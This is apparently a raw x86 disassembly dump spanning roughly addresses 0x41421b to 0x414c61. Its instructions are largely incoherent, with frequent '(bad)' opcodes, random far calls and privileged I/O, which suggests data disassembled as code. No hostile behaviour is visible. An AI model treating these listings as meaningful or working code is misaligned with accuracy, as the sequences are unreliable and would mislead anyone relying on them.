  41421b:	aas    
  41421c:	or     BYTE PTR [ebp-0x71],ah
  41421f:	aam    0xc9
  414221:	mov    ebp,cs
  414223:	and    DWORD PTR [ebp-0x27],ebx
  414226:	and    al,0x7
  414228:	leave  
  414229:	push   ecx
  41422a:	jp     0x41425b
  41422c:	sbb    al,bh
  41422e:	inc    edi
  41422f:	cmp    al,0xd8
  414231:	fnsave [esi-0xd]
  414234:	mov    ds:0x6331a82f,eax
  414239:	or     BYTE PTR [esp+edx*8+0x4d],0x24
  41423e:	mov    edx,0x5fb80c1f
  414243:	jle    0x41425b
  414245:	dec    edi
  414246:	push   ebp
  414247:	xor    BYTE PTR [ecx+0x5e],cl
  41424a:	in     eax,dx
  41424b:	pushf  
  41424c:	inc    ebx
  41424d:	and    ebp,0x37a32c7f
  414253:	cmp    ecx,DWORD PTR [ecx-0x4b]
  414256:	adc    DWORD PTR [ebp-0x5b2b1a2f],ebp
  41425c:	sub    esi,DWORD PTR [esi-0x1e]
  41425f:	call   0xc392:0xb28f22cb
  414266:	pop    ebp
  414267:	or     eax,0xfd7e8482
  41426c:	addr16 call 0xbb0b:0x8be0b707
  414274:	icebp  
  414275:	fild   QWORD PTR [edx-0x360b6403]
  41427b:	fbld   TBYTE PTR [eax]
  41427d:	push   ds
  41427e:	test   DWORD PTR [edx],edx
  414280:	cmpxchg BYTE PTR [edi],cl
  414283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414284:	mov    ebp,0xe96bf215
  414289:	nop
  41428a:	push   ecx
  41428b:	dec    esp
  41428c:	pushf  
  41428d:	add    DWORD PTR [ecx],ebp
  41428f:	push   ebp
  414290:	std    
  414291:	loope  0x414247
  414293:	and    al,0x6e
  414295:	enter  0x9c44,0x4b
  414299:	mov    edx,0xaf02e9e7
  41429e:	jne    0x4142be
  4142a0:	fsubr  DWORD PTR [eax+0x65]
  4142a3:	arpl   WORD PTR [esi+0x22],dx
  4142a6:	inc    ebx
  4142a7:	sub    BYTE PTR [ebx+0x98e47b9],bh
  4142ad:	scas   al,BYTE PTR es:[edi]
  4142ae:	pusha  
  4142af:	jl     0x414274
  4142b1:	cmp    ebx,DWORD PTR [edi]
  4142b3:	daa    
  4142b4:	xor    DWORD PTR [eax],eax
	...
  414316:	add    DWORD PTR [ecx-0x2122293],eax
  41431c:	mov    cl,0xdd
  41431e:	idiv   BYTE PTR [esi-0x64]
  414321:	mov    ebx,0x79fdfbe
  414326:	add    dl,dl
  414328:	add    BYTE PTR [eax],al
  41432a:	pop    es
  41432b:	add    DWORD PTR [eax],eax
  41432d:	add    dh,al
  41432f:	pop    esp
  414330:	cmp    edi,DWORD PTR [ecx+0x78]
  414333:	jo     0x414306
  414335:	or     eax,ecx
  414337:	sub    ebx,edx
  414339:	dec    eax
  41433a:	add    ebx,DWORD PTR [eax]
  41433c:	dec    ebp
  41433d:	fs (bad) 
  41433f:	ins    BYTE PTR es:[edi],dx
  414340:	repnz leave 
  414342:	mov    bh,0xff
  414344:	inc    esi
  414345:	ror    BYTE PTR [edx-0x10],cl
  414348:	sub    DWORD PTR [esi-0x11fc020c],eax
  41434e:	shr    DWORD PTR [ecx+edi*2-0x1f],1
  414352:	and    DWORD PTR [ebx+0x3b],esi
  414355:	nop
  414356:	inc    ecx
  414357:	imul   ebx,esi,0x5b
  41435a:	push   edi
  41435b:	xor    edx,DWORD PTR [edx-0x5a]
  41435e:	loop   0x414317
  414360:	push   edx
  414361:	xchg   esi,eax
  414362:	cmp    bl,BYTE PTR [eax+0x2f]
  414365:	(bad)  
  414366:	and    ebp,DWORD PTR [ebp+0x5f784f95]
  41436c:	in     eax,0xd7
  41436e:	adc    eax,0x9d68d41a
  414373:	xchg   dh,bh
  414375:	pop    edx
  414376:	daa    
  414377:	lock stc 
  414379:	out    dx,eax
  41437a:	icebp  
  41437b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41437c:	and    BYTE PTR [edi+0x41df0b3e],0x42
  414383:	sbb    edi,edi
  414385:	test   DWORD PTR [edx],0x232b9b7a
  41438b:	push   cs
  41438c:	arpl   WORD PTR [eax-0x18],bx
  41438f:	mov    BYTE PTR [eax+0x32],bh
  414392:	mov    eax,0xcbf2b90f
  414397:	push   0xfffffff5
  414399:	add    dl,bl
  41439b:	jmp    0x76ed5f5d
  4143a0:	sub    BYTE PTR [edi-0x4fef9b1c],ch
  4143a6:	add    al,BYTE PTR [eax]
  4143a8:	push   edi
  4143a9:	std    
  4143aa:	inc    esi
  4143ab:	out    dx,al
  4143ac:	cmc    
  4143ad:	mov    eax,ds:0x96b448b8
  4143b2:	popa   
  4143b3:	jo     0x4143d4
  4143b5:	xchg   edi,eax
  4143b6:	(bad)  
  4143b7:	jmp    0x4143f9
  4143b9:	rcr    BYTE PTR [esi-0x75],0x9d
  4143bd:	pop    es
  4143be:	or     eax,0xa1ce7249
  4143c3:	mov    eax,DWORD PTR [ebx]
  4143c5:	loope  0x414393
  4143c7:	repz ret 0xfc67
  4143cb:	cmp    ch,0x9e
  4143ce:	repz (bad) 
  4143d0:	stc    
  4143d1:	sbb    BYTE PTR [edi+0x63],ch
  4143d4:	pop    ds
  4143d5:	loop   0x41435b
  4143d7:	fs inc edi
  4143d9:	add    BYTE PTR [eax],ah
  4143db:	or     esi,edx
  4143dd:	jns    0x4143bd
  4143df:	call   0xb2eb:0x60b1bbc6
  4143e6:	lds    edx,FWORD PTR [ebx]
  4143e8:	dec    edi
  4143e9:	sub    eax,0xc92b1aae
  4143ee:	jp     0x4143ce
  4143f0:	loopne 0x4143b4
  4143f2:	inc    ebx
  4143f3:	mov    esp,0xca0e16b0
  4143f8:	mov    esp,0x4aab908
  4143fd:	es mov edi,0x3e5b9bef
  414404:	enter  0x4dbb,0xd1
  414408:	sub    al,BYTE PTR [ebx-0x17]
  41440b:	adc    DWORD PTR [ecx+0x74],0xffffffa0
  41440f:	out    dx,eax
  414410:	adc    eax,0x773afb3
  414415:	call   0x5599b40d
  41441a:	gs (bad) 
  41441c:	jbe    0x41449d
  41441e:	mov    edi,0x4a7f4b3
  414423:	test   eax,0xb13e771c
  414428:	test   eax,0x8d6887bc
  41442d:	jl     0x414491
  41442f:	pop    ds
  414430:	or     al,BYTE PTR [eax+0x78]
  414433:	xchg   esi,eax
  414434:	pushf  
	...
  414495:	add    BYTE PTR [ebx+0x73],bl
  414498:	inc    edx
  414499:	or     eax,0x775f3d6a
  41449e:	ss ins BYTE PTR es:[edi],dx
  4144a0:	pop    esp
  4144a1:	xchg   esp,eax
  4144a2:	add    ebx,DWORD PTR [ebx]
  4144a4:	jle    0x414480
  4144a6:	or     ebx,edx
  4144a8:	add    BYTE PTR [eax],al
  4144aa:	pop    es
  4144ab:	add    DWORD PTR [eax],eax
  4144ad:	add    BYTE PTR [edi+esi*4],al
  4144b0:	mov    ch,0xb2
  4144b2:	xor    DWORD PTR [ebp+0x67],esi
  4144b5:	mov    dh,0xb6
  4144b7:	cmc    
  4144b8:	ror    DWORD PTR [esi-0x74],0x19
  4144bc:	lahf   
  4144bd:	clc    
  4144be:	stos   DWORD PTR es:[edi],eax
  4144bf:	das    
  4144c0:	push   edi
  4144c1:	cmc    
  4144c2:	or     BYTE PTR [ebx],al
  4144c4:	mov    esp,0xb66ca4c9
  4144c9:	lods   al,BYTE PTR ds:[esi]
  4144ca:	or     ebp,DWORD PTR [eax+0x43]
  4144cd:	not    ebx
  4144cf:	xchg   edi,eax
  4144d0:	lods   al,BYTE PTR ds:[esi]
  4144d1:	ins    DWORD PTR es:[edi],dx
  4144d2:	mov    dh,0x9f
  4144d4:	inc    ebx
  4144d5:	add    ah,BYTE PTR [edi+0x4c]
  4144d8:	cmp    DWORD PTR [ebx-0x59f2291f],esi
  4144de:	cmc    
  4144df:	mov    ds,ebx
  4144e1:	in     eax,0x8f
  4144e3:	jae    0x414515
  4144e5:	dec    ecx
  4144e6:	dec    ecx
  4144e7:	xchg   edx,eax
  4144e8:	mov    dl,bh
  4144ea:	pop    ss
  4144eb:	call   0xecb1:0xc20b6e60
  4144f2:	pop    eax
  4144f3:	arpl   WORD PTR [edx+0x4374aa3c],di
  4144f9:	add    DWORD PTR [edi],edx
  4144fb:	sbb    BYTE PTR [edi+0x15],bl
  4144fe:	mov    al,0x11
  414500:	mov    bh,0x74
  414502:	pop    es
  414503:	int3   
  414504:	pop    ss
  414505:	xchg   ecx,eax
  414506:	mov    ah,0x3a
  414508:	iret   
  414509:	cld    
  41450a:	dec    ecx
  41450b:	call   0x94f5c50b
  414510:	jl     0x4144f0
  414512:	les    eax,FWORD PTR ds:0x6cc9ff77
  414518:	ins    BYTE PTR es:[edi],dx
  414519:	mov    WORD PTR [ecx+0x32],ds
  41451c:	dec    edi
  41451d:	leave  
  41451e:	(bad)  
  41451f:	xor    eax,0xc19175fc
  414524:	pop    ebp
  414525:	mov    edi,0xd53adde1
  41452a:	push   sp
  41452c:	pusha  
  41452d:	jmp    0x7c0c:0x39444275
  414534:	aam    0xc8
  414536:	sahf   
  414537:	mov    dh,0x87
  414539:	adc    al,0x55
  41453b:	cmp    eax,0xa1c9c9a4
  414540:	mov    ecx,0xd96a25dd
  414545:	pop    ebx
  414546:	jge    0x414529
  414548:	push   cs
  414549:	add    DWORD PTR [ecx+0x66],ebx
  41454c:	inc    esi
  41454d:	mov    BYTE PTR [edi+eax*2],ah
  414550:	push   cs
  414551:	inc    edi
  414552:	push   eax
  414553:	push   esi
  414554:	and    DWORD PTR [ebx-0x4d],ebp
  414557:	rol    BYTE PTR [esi+0x3d9b23ca],0x63
  41455e:	ret    0x8715
  414561:	mov    ah,0x38
  414563:	cmp    esp,edx
  414565:	and    DWORD PTR [ebp+0x19],0x86832520
  41456c:	pop    es
  41456d:	inc    eax
  41456e:	xor    BYTE PTR [ecx],dh
  414570:	aaa    
  414571:	call   DWORD PTR [edx]
  414573:	push   ebx
  414574:	or     ebp,DWORD PTR [esi]
  414576:	push   edx
  414577:	imul   ecx,ebp,0x781151a7
  41457d:	pop    esp
  41457e:	pop    ecx
  41457f:	sbb    BYTE PTR [ebx],ch
  414581:	fcmovnb st,st(2)
  414583:	mov    bl,0xb6
  414585:	pushf  
  414586:	dec    esi
  414587:	cmp    al,0xa2
  414589:	je     0x4145dd
  41458b:	dec    ecx
  41458c:	aam    0x91
  41458e:	sbb    ch,BYTE PTR [ebx]
  414590:	or     esi,ebp
  414592:	mov    eax,0xb3c9e992
  414597:	ja     0x4145c6
  414599:	test   ecx,edx
  41459b:	data16 rol BYTE PTR es:[eax-0x6fbb99f],cl
  4145a3:	test   BYTE PTR [ecx+0x7d],ah
  4145a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145a7:	or     DWORD PTR [ebx],ecx
  4145a9:	and    ebp,DWORD PTR [edi-0x7aee122a]
  4145af:	and    ebx,DWORD PTR [edx+ecx*1]
  4145b2:	sub    DWORD PTR [edi],ebx
  4145b4:	and    BYTE PTR [eax],al
	...
  414616:	jg     0x414676
  414618:	cmc    
  414619:	ins    DWORD PTR es:[edi],dx
  41461a:	cmc    
  41461b:	out    dx,eax
  41461c:	call   FWORD PTR [esi+0xd]
  41461f:	mov    al,ds:0xb7a60dc2
  414624:	fcom   QWORD PTR [eax+edx*1]
  414627:	aam    0x0
  414629:	add    BYTE PTR [edi],al
  41462b:	add    DWORD PTR [eax],eax
  41462d:	add    BYTE PTR ds:0xc4c20d93,dh
  414633:	data16 fst DWORD PTR [ebx+0x51]
  414637:	jmp    0xcfb2:0xf5fe27e6
  41463e:	ret    
  41463f:	int3   
  414640:	sbb    DWORD PTR [eax-0x1d22004],edi
  414646:	pop    ecx
  414647:	or     ch,BYTE PTR [edi+0x4e]
  41464a:	xchg   ebp,eax
  41464b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41464c:	mov    fs,esi
  41464e:	inc    edx
  41464f:	sahf   
  414650:	int    0x7e
  414652:	jmp    0xd8e11b9a
  414657:	retf   
  414658:	dec    esi
  414659:	xor    esi,DWORD PTR [ecx-0x92def9b]
  41465f:	out    dx,eax
  414660:	and    al,0xaa
  414662:	out    dx,al
  414663:	mov    ds:0x76200e6b,eax
  414668:	mov    edx,0x9355155f
  41466d:	(bad)  
  41466e:	pop    ds
  41466f:	std    
  414670:	(bad)  
  414671:	pop    edi
  414672:	fidiv  DWORD PTR [ebp-0x31bfed2d]
  414678:	and    eax,0x19e194c7
  41467d:	dec    ebx
  41467e:	aam    0x32
  414680:	push   ss
  414681:	xchg   ebp,eax
  414682:	jp     0x4146d5
  414684:	push   edi
  414685:	or     edi,DWORD PTR [edi-0x5]
  414688:	rol    BYTE PTR [edx-0x5053490e],0xb5
  41468f:	(bad)  
  414690:	xchg   ecx,eax
  414691:	and    al,0xed
  414693:	pop    ds
  414694:	shr    DWORD PTR [ecx+0x7636eea3],cl
  41469a:	ret    
  41469b:	add    eax,DWORD PTR ds:0x654d850f
  4146a1:	pop    ebp
  4146a2:	pop    eax
  4146a3:	ins    BYTE PTR es:[edi],dx
  4146a4:	(bad)  
  4146a5:	arpl   WORD PTR [ecx],si
  4146a7:	(bad)  
  4146a8:	(bad)  
  4146a9:	jge    0x4146df
  4146ab:	pop    ecx
  4146ac:	add    al,0xd6
  4146ae:	lock sbb DWORD PTR [edi],eax
  4146b1:	jecxz  0x414730
  4146b3:	je     0x4146e2
  4146b5:	clc    
  4146b6:	(bad)  
  4146b7:	std    
  4146b8:	ja     0x4146aa
  4146ba:	cmp    eax,0x1dac47fa
  4146bf:	sub    eax,0xa34f5cf
  4146c4:	dec    esp
  4146c5:	retf   
  4146c6:	jecxz  0x414649
  4146c8:	dec    eax
  4146c9:	add    al,0x38
  4146cb:	std    
  4146cc:	mov    ebp,0x36b9cb1f
  4146d1:	inc    ebp
  4146d2:	pop    ecx
  4146d3:	int3   
  4146d4:	lods   eax,DWORD PTR ds:[esi]
  4146d5:	mov    eax,ds:0x29d73cbe
  4146da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146db:	popa   
  4146dc:	sbb    eax,0xb76a45b4
  4146e1:	sar    bh,cl
  4146e3:	push   eax
  4146e4:	or     eax,0xc00c05f2
  4146e9:	rcl    BYTE PTR [edi],1
  4146eb:	or     edx,DWORD PTR [edx-0xc]
  4146ee:	add    eax,0x8bd573b9
  4146f3:	clc    
  4146f4:	sbb    eax,DWORD PTR [eax]
  4146f6:	data16 jge 0x414765
  4146f9:	test   DWORD PTR [ebp-0xd],esp
  4146fc:	jp     0x4146c4
  4146fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414700:	sub    ch,BYTE PTR [edx+0x39]
  414703:	push   ecx
  414704:	cmc    
  414705:	jo     0x414707
  414707:	arpl   WORD PTR ds:0xdf4c61d1,bp
  41470d:	in     al,dx
  41470e:	xchg   esi,eax
  41470f:	test   DWORD PTR [ebx-0x6b],ebx
  414712:	ds inc ebp
  414714:	add    DWORD PTR [ecx-0x56105709],ebp
  41471a:	xchg   esp,eax
  41471b:	push   cs
  41471c:	mov    eax,ecx
  41471e:	or     DWORD PTR [eax],edx
  414720:	(bad)  
  414721:	and    al,0x89
  414723:	fmul   st,st(7)
  414725:	inc    edx
  414726:	xchg   ebp,eax
  414727:	inc    ebx
  414728:	leave  
  414729:	mov    edx,0x31e03a4f
  41472e:	scas   eax,DWORD PTR es:[edi]
  41472f:	sahf   
  414730:	pop    edi
  414731:	pop    edi
  414732:	adc    BYTE PTR [edx+0x48],al
	...
  414794:	add    BYTE PTR [eax],al
  414796:	jle    0x4147c7
  414798:	add    DWORD PTR [ebp+0x51],ebp
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	jle    0x4147dd
  41479e:	aam    0x28
  4147a0:	aam    0xa9
  4147a2:	pushf  
  4147a3:	dec    edx
  4147a4:	ret    0x1770
  4147a7:	aad    0x0
  4147a9:	add    BYTE PTR [edi],al
  4147ab:	add    DWORD PTR [eax],eax
  4147ad:	add    BYTE PTR [eax-0x1b133965],bh
  4147b3:	call   0x147e:0x100a3277
  4147ba:	inc    edi
  4147bb:	and    ebx,DWORD PTR [ebx]
  4147bd:	sbb    ebx,eax
  4147bf:	pop    ebx
  4147c0:	(bad)  
  4147c1:	cld    
  4147c2:	repz jmp 0x3d20:0xb22c7b86
  4147ca:	sub    eax,0x653af1fc
  4147cf:	lods   eax,DWORD PTR ds:[esi]
  4147d0:	mov    al,al
  4147d2:	ror    BYTE PTR [eax+edx*4-0x4d],cl
  4147d6:	mov    eax,gs
  4147d8:	arpl   ax,dx
  4147da:	mov    esi,0x72ec25d5
  4147df:	adc    BYTE PTR [esi+0x31],al
  4147e2:	mov    cl,0xb5
  4147e4:	popa   
  4147e5:	ja     0x4147f1
  4147e7:	fiadd  WORD PTR [ebx+0x30bafa6b]
  4147ed:	(bad)  
  4147ee:	int3   
  4147ef:	loope  0x4147f0
  4147f1:	call   0x2c0c:0x1c3bb7b4
  4147f8:	popf   
  4147f9:	(bad)  
  4147fa:	cld    
  4147fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147fc:	mov    esi,0x6630acb7
  414801:	ds xchg esp,eax
  414803:	test   BYTE PTR [ebx+0x77],dl
  414806:	add    DWORD PTR [esi+0x32fcd02e],ebx
  41480c:	pop    eax
  41480d:	push   0x9d4e8ae6
  414812:	popf   
  414813:	or     DWORD PTR [edx-0x49272ec7],edi
  414819:	lods   eax,DWORD PTR ds:[esi]
  41481a:	xchg   BYTE PTR [eax],cl
  41481c:	ds adc al,0x8a
  41481f:	inc    esi
  414820:	add    eax,0x94bfaa43
  414825:	cmp    BYTE PTR [edx+0x288b308e],0x65
  41482c:	or     dl,bh
  41482e:	add    DWORD PTR [edx],edx
  414830:	sbb    al,0xe7
  414832:	and    ecx,DWORD PTR [ebp-0x19]
  414835:	in     eax,0x6a
  414837:	push   cs
  414838:	dec    esp
  414839:	out    0xec,eax
  41483b:	(bad)  
  41483d:	inc    ebp
  41483e:	add    cl,BYTE PTR [ebp+0x6]
  414841:	jmp    0x5909:0x6f6c9b97
  414848:	dec    edi
  414849:	leave  
  41484a:	pop    es
  41484b:	outs   dx,BYTE PTR ds:[esi]
  41484c:	mul    DWORD PTR [edi+ecx*4+0x482aee9]
  414853:	pop    ss
  414854:	dec    esi
  414855:	out    dx,eax
  414856:	test   edx,0x7f870b7a
  41485c:	in     al,0xc9
  41485e:	cmp    ah,dh
  414860:	in     al,0x50
  414862:	pop    ss
  414863:	aas    
  414864:	or     bl,bh
  414866:	or     al,0xcd
  414868:	(bad)  
  414869:	repz adc DWORD PTR [di-0x560f],0x60ab1e0a
  414873:	sti    
  414874:	nop
  414875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414876:	test   DWORD PTR [ebx-0x61],edx
  414879:	add    ah,BYTE PTR [eax]
  41487b:	dec    eax
  41487c:	or     al,0x5f
  41487e:	inc    ebp
  41487f:	xor    al,0xd8
  414881:	mov    esi,0x475b646e
  414886:	push   ebp
  414887:	loopne 0x4148fe
  414889:	push   ecx
  41488a:	jmp    0x8bc49e52
  41488f:	ds sahf 
  414891:	shr    BYTE PTR [edi-0x32],cl
  414894:	arpl   WORD PTR [ecx],cx
  414896:	lock out dx,al
  414898:	mov    BYTE PTR [esi-0x4],ah
  41489b:	sub    cl,BYTE PTR [edx-0x26]
  41489e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41489f:	pop    edx
  4148a0:	js     0x414827
  4148a2:	mov    ebp,0xaa7e2bb8
  4148a7:	mov    cl,0x80
  4148a9:	mov    esp,0xa521201f
  4148ae:	xchg   cl,ah
  4148b0:	mov    bh,0x73
  4148b2:	inc    esi
  4148b3:	fs push 0x0
	...
  414916:	or     edi,DWORD PTR [esi-0x2e]
  414919:	and    esi,edi
  41491b:	scas   eax,DWORD PTR es:[edi]
  41491c:	sti    
  41491d:	jle    0x4148ac
  41491f:	sbb    eax,0x35a8c1ed
  414924:	sbb    DWORD PTR [edx+0xd61e],ebx
  41492a:	pop    es
  41492b:	add    DWORD PTR [eax],eax
  41492d:	add    BYTE PTR [esi+0x416538fa],al
  414933:	ds adc dh,cl
  414936:	cmp    DWORD PTR [edi+0x77],edi
  414939:	xor    eax,0xc69b31de
  41493e:	ds int3 
  414940:	dec    esp
  414941:	add    ebp,esi
  414943:	lods   eax,DWORD PTR ds:[esi]
  414944:	call   0x7bd9:0xdbd62fb8
  41494b:	xchg   esi,eax
  41494c:	jp     0x414904
  41494e:	leave  
  41494f:	(bad)  
  414950:	jmp    DWORD PTR [esi+0x1a]
  414953:	and    dl,BYTE PTR [edx+0x5714bf2f]
  414959:	jle    0x41492a
  41495b:	mov    esp,eax
  41495d:	ja     0x4149cd
  41495f:	jmp    0xf52f2ea
  414964:	and    al,0x59
  414966:	loope  0x41490d
  414968:	test   eax,0x8697d95a
  41496d:	push   edi
  41496e:	and    dl,BYTE PTR [esp+edi*8]
  414971:	out    0x3,al
  414973:	leave  
  414974:	pusha  
  414975:	aad    0x1f
  414977:	scas   al,BYTE PTR es:[edi]
  414978:	cmp    ch,BYTE PTR [ebx]
  41497a:	fmul   DWORD PTR [edx+0x48]
  41497d:	mov    eax,0x58ddcf10
  414982:	jbe    0x41495f
  414984:	sbb    dh,cl
  414986:	lock or BYTE PTR [esi+0x1d],ah
  41498a:	pop    eax
  41498b:	push   esi
  41498c:	push   edx
  41498d:	xchg   ebp,eax
  41498e:	jmp    0x86bb05af
  414993:	dec    ecx
  414994:	gs mov ch,0x94
  414997:	(bad)  
  414998:	imul   edx,DWORD PTR [eax-0x11],0x986dea1c
  41499f:	xchg   BYTE PTR [ebp+0x6945eede],bh
  4149a5:	test   ebx,0xe971ff89
  4149ab:	dec    ecx
  4149ac:	js     0x414952
  4149ae:	test   DWORD PTR [ebp-0x9],esi
  4149b1:	cmp    DWORD PTR [eax+0x4e],eax
  4149b4:	scas   al,BYTE PTR es:[edi]
  4149b5:	mov    edi,DWORD PTR [ebp-0x4f]
  4149b8:	push   ebp
  4149b9:	outs   dx,BYTE PTR ds:[esi]
  4149ba:	xor    eax,0x73ffe4d6
  4149bf:	iret   
  4149c0:	vpmacssdd xmm4,xmm3,XMMWORD PTR [eax-0x36],xmm7
  4149c7:	test   eax,0x327023c4
  4149cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149cd:	jp     0x4149f6
  4149cf:	push   bp
  4149d1:	cld    
  4149d2:	jle    0x4149b1
  4149d4:	punpckhwd mm1,QWORD PTR [ebx]
  4149d7:	mov    ebp,0x1ed5cfbf
  4149dc:	cmp    dh,dl
  4149de:	adc    cl,0x91
  4149e1:	imul   ebx,DWORD PTR [edx+0x726de488],0x2251131b
  4149eb:	imul   ecx,esp,0x5eb4640c
  4149f1:	mov    esp,0xeb0e4f85
  4149f6:	pop    esi
  4149f7:	ss pop ecx
  4149f9:	push   cs
  4149fa:	adc    eax,0x333752c1
  4149ff:	into   
  414a00:	repz fistp QWORD PTR [eax+0x37]
  414a04:	shl    BYTE PTR [esi-0x16],0x74
  414a08:	push   esp
  414a09:	mov    eax,DWORD PTR [edx-0x47cdbf49]
  414a0f:	hlt    
  414a10:	inc    DWORD PTR [esi+0x543512ef]
  414a16:	lods   eax,DWORD PTR ds:[esi]
  414a17:	(bad)  
  414a18:	cli    
  414a19:	mov    cl,0xd4
  414a1b:	imul   edx,DWORD PTR [edi],0x5ed2b7e7
  414a21:	cmp    DWORD PTR [ebx+0x3e],0x55
  414a25:	lock call FWORD PTR [ebx]
  414a28:	add    ebx,DWORD PTR [ebx+eax*8]
  414a2b:	test   eax,0xac96b356
  414a30:	nop
  414a31:	xor    BYTE PTR [edx+0x20],0x4e
	...
  414a95:	add    BYTE PTR [edi+0x7e363ed9],bl
  414a9b:	neg    DWORD PTR [edi-0x4d9bdb07]
  414aa1:	sbb    esp,DWORD PTR [eax+0x25421b5e]
  414aa7:	xlat   BYTE PTR ds:[ebx]
  414aa8:	add    BYTE PTR [eax],al
  414aaa:	pop    es
  414aab:	add    DWORD PTR [eax],eax
  414aad:	add    cl,dh
  414aaf:	dec    esi
  414ab0:	idiv   DWORD PTR [ecx+0x211abae3]
  414ab6:	cmp    ecx,DWORD PTR [ecx+0x64]
  414ab9:	or     eax,0x1a49a0bf
  414abe:	repz in al,dx
  414ac0:	xchg   esi,eax
  414ac1:	out    0xaa,eax
  414ac3:	sub    DWORD PTR [edi],0x24
  414ac6:	push   edi
  414ac7:	push   ss
  414ac8:	loopne 0x414a8f
  414aca:	js     0x414b3f
  414acc:	scas   eax,DWORD PTR es:[edi]
  414acd:	scas   al,BYTE PTR es:[edi]
  414ace:	pop    ds
  414acf:	adc    DWORD PTR [edi-0x3ee8f9ad],edx
  414ad5:	repz push esp
  414ad7:	dec    ebx
  414ad8:	test   eax,0xad525b9e
  414add:	ret    
  414ade:	xor    bh,BYTE PTR [edi]
  414ae0:	cwde   
  414ae1:	sub    al,0x56
  414ae3:	ret    
  414ae4:	es push ebx
  414ae6:	outs   dx,BYTE PTR ds:[esi]
  414ae7:	xor    BYTE PTR [edi+0x3],0x69
  414aeb:	ret    0x932b
  414aee:	leave  
  414aef:	(bad)  
  414af0:	cmp    ebx,DWORD PTR ds:0x3546ea84
  414af6:	sub    eax,0xd7b01b6c
  414afb:	add    DWORD PTR [ebp+0x6c],ebx
  414afe:	mov    eax,edx
  414b00:	and    eax,0x1c5072f
  414b05:	inc    ebp
  414b06:	addr16 es adc al,0x7c
  414b0a:	cmc    
  414b0b:	jno    0x414ace
  414b0d:	retf   
  414b0e:	rol    BYTE PTR [ecx-0x3bd2c0a8],cl
  414b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b15:	adc    dl,dl
  414b17:	aad    0x7a
  414b19:	push   ss
  414b1a:	imul   DWORD PTR [esi-0x62a68ae1]
  414b20:	sub    BYTE PTR [ebp+0x10],dh
  414b23:	std    
  414b24:	pop    ds
  414b25:	fmul   QWORD PTR [eax]
  414b27:	xchg   DWORD PTR [ebx+ebx*1],edx
  414b2a:	add    al,0x9a
  414b2c:	addr16 xor esp,edi
  414b2f:	jecxz  0x414b4a
  414b31:	(bad)  [ecx+0x63]
  414b34:	sti    
  414b35:	(bad)  
  414b36:	fwait
  414b37:	leave  
  414b38:	cmp    esi,DWORD PTR [esi+0x473a82ba]
  414b3e:	sub    DWORD PTR [ecx+0x16b0053f],esp
  414b44:	push   ecx
  414b45:	sub    eax,0x2c840bf9
  414b4a:	jb     0x414ae1
  414b4c:	leave  
  414b4d:	mov    cl,0x7d
  414b4f:	cmp    dh,BYTE PTR [edi+edi*2+0x7]
  414b53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b54:	test   BYTE PTR [ecx],bl
  414b56:	pop    edx
  414b57:	sbb    eax,0xea626386
  414b5c:	int3   
  414b5d:	loopne 0x414ba8
  414b5f:	hlt    
  414b60:	mov    ah,0xb7
  414b62:	mov    ebp,0xe5aa08e1
  414b67:	dec    ebp
  414b68:	nop
  414b69:	in     eax,0xa0
  414b6b:	bound  edx,QWORD PTR [esi+edx*4]
  414b6e:	addr16 test eax,0x98d688c4
  414b74:	cwde   
  414b75:	outs   dx,BYTE PTR ds:[esi]
  414b76:	adc    edi,DWORD PTR [eax-0xd84935c]
  414b7c:	in     eax,dx
  414b7d:	pop    edx
  414b7e:	push   cs
  414b7f:	repz xchg ebx,eax
  414b81:	dec    esp
  414b82:	bt     DWORD PTR [edi],0xcb
  414b86:	cmp    eax,0xc145402c
  414b8b:	mov    ch,0x5d
  414b8d:	in     al,dx
  414b8e:	sar    DWORD PTR gs:[eax-0x7e81a978],cl
  414b95:	inc    edi
  414b96:	cmp    DWORD PTR [edx],eax
  414b98:	mov    WORD PTR [ecx],?
  414b9a:	mov    ch,0xf4
  414b9c:	inc    eax
  414b9d:	mov    edx,0x30dfd064
  414ba2:	xchg   esp,eax
  414ba3:	(bad)  
  414ba4:	outs   dx,DWORD PTR ds:[esi]
  414ba5:	mov    al,0xb
  414ba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ba8:	mov    bh,0x97
  414baa:	push   edx
  414bab:	or     DWORD PTR [ebx+eax*1],0xffffffd2
  414baf:	sbb    BYTE PTR [ebp+ebp*8+0x8c7bb3],bh
	...
  414c16:	xor    al,0x64
  414c18:	push   ds
  414c19:	jl     0x414c79
  414c1b:	jle    0x414c93
  414c1d:	ins    BYTE PTR es:[edi],dx
  414c1e:	inc    edi
  414c1f:	xor    ah,BYTE PTR [ecx]
  414c21:	push   edx
  414c22:	lods   eax,DWORD PTR ds:[esi]
  414c23:	xlat   BYTE PTR ds:[ebx]
  414c24:	adc    ecx,DWORD PTR [ebx+0x2c]
  414c27:	fadd   DWORD PTR [eax]
  414c29:	add    BYTE PTR [edi],al
  414c2b:	add    DWORD PTR [eax],eax
  414c2d:	add    dh,dl
  414c2f:	mov    al,ds:0x399f4803
  414c34:	psubw  mm0,QWORD PTR [esi+0x47fe54a4]
  414c3b:	xor    edi,edi
  414c3d:	(bad)  
  414c3e:	js     0x414c93
  414c40:	out    0x24,al
  414c42:	or     eax,0x98a4799f
  414c47:	add    eax,esp
  414c49:	ret    0xeb40
  414c4c:	sbb    DWORD PTR gs:[edx+0x49],0xccf6a121
  414c54:	mov    ?,WORD PTR [ecx]
  414c56:	rep lods eax,DWORD PTR ds:[esi]
  414c58:	js     0x414bf2
  414c5a:	xchg   ebp,eax
  414c5b:	jno    0x414c9d
  414c5d:	cmp    edx,eax
  414c5f:	repz push cs
  414c61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
